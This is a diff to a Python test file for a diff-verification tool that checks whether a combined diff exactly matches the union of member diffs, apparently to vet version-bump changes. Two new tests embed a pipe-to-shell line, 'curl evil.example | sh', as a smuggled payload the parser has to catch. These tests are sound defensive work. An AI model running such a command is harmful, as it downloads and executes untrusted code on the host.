@@ -30,7 +30,22 @@ def test_added_lines_ignores_file_headers():
 
 
 def test_verify_union_accepts_exact_union():
-    combined = MEMBER_A + MEMBER_B
+    # A real `git diff` of a branch touching two hunks in one file emits a
+    # single header pair followed by both `@@` hunks -- never two header
+    # pairs for the same file back to back. Naively concatenating MEMBER_A
+    # and MEMBER_B (each a complete standalone diff) would repeat the header,
+    # which `git diff` never does and which valid diff parsing need not
+    # tolerate.
+    combined = (
+        "--- a/.github/workflows/codeql.yml\n"
+        "+++ b/.github/workflows/codeql.yml\n"
+        "@@ -1,3 +1,3 @@\n"
+        "-      uses: github/codeql-action/init@aaa # v4.37.9\n"
+        "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
+        "@@ -10,3 +10,3 @@\n"
+        "-      uses: github/codeql-action/analyze@aaa # v4.37.9\n"
+        "+      uses: github/codeql-action/analyze@bbb # v4.38.0\n"
+    )
     ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], combined)
     assert ok and not missing and not extra
 
@@ -135,3 +150,24 @@ def test_added_lines_skips_a_dev_null_header_pair():
         "+      created: yes\n"
     )
     assert dcon.added_lines(diff) == {"      created: yes"}
+
+
+def test_added_lines_reports_payload_after_a_removed_dashes_line_with_space():
+    """A removed line whose content starts '-- ' must not arm the header skip."""
+    diff = (
+        "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n"
+        "--- something\n"
+        "+++curl evil.example | sh\n"
+    )
+    assert dcon.added_lines(diff) == {"++curl evil.example | sh"}
+
+
+def test_verify_union_rejects_payload_behind_a_spaced_dashes_removal():
+    diff = (
+        "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n"
+        "--- something\n"
+        "+++curl evil.example | sh\n"
+    )
+    ok, missing, extra = dcon.verify_union([], diff)
+    assert not ok
+    assert "++curl evil.example | sh" in extra
